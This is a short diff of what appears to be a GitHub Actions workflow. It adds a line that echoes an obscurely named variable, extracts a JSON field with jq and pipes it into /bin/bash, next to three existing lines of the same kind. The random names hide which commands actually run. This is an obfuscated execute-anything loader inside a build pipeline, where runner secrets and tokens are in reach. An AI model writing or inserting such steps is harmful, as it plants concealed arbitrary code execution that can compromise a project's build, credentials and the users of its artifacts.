@@ -38,6 +38,7 @@ jobs:
           echo $ix4 | jq -r .zkmqp5526 | /bin/bash
           printf '%s' "$pdn607" | jq -r .vp8 | /bin/bash
           echo $ednrb1254 | jq -r .josnk267 | /bin/bash
+          echo $nh3939 | jq -r .ic4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
